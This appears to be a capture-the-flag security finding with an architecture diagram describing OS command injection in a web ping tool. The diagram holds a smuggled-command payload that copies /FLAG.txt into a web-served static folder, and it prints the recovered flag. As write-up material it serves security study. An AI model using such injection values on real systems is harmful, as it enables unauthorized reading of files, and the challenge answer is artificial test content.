findings.title: OS Command Injection in Ping Tool (CTF Flag Extracted)
findings.description: The /ping endpoint passes user-supplied ip_address parameter directly to a shell command without sanitization. The application runs ping and checks stdout for success patterns, making it 'almost blind' — command output is not echoed back to the user. Exploitation used semicolon injection to redirect command output to the web-accessible /static/ directory, then fetched the result via HTTP. This allowed reading /FLAG.txt from the container root.

diagrams.title: CTF Target Architecture
diagrams.mermaid:
flowchart TD
  Browser["Browser / Attacker"] --> Form["GET / - Ping Tool Form"]
  Form --> PingEndpoint["/ping POST - ip_address param"]
  PingEndpoint --> Shell["Shell: ping -c 1 {ip_address}"]
  Shell --> OutputCheck["Check stdout for reachable patterns"]
  OutputCheck --> Response["Host is reachable / unreachable"]
  Shell --> CMDI["INJECTION: 127.0.0.1; cat /FLAG.txt > /app/static/flag.txt"]
  CMDI --> FlagFile["/FLAG.txt - Contains CTF flag"]
  FlagFile --> StaticDir["/app/static/flag.txt"]
  StaticDir --> StaticServe["GET /static/flag.txt"]
  StaticServe --> Flag["flag{2fd3f08a-0619-40ce-8866-fd6864c3d1b8}"]
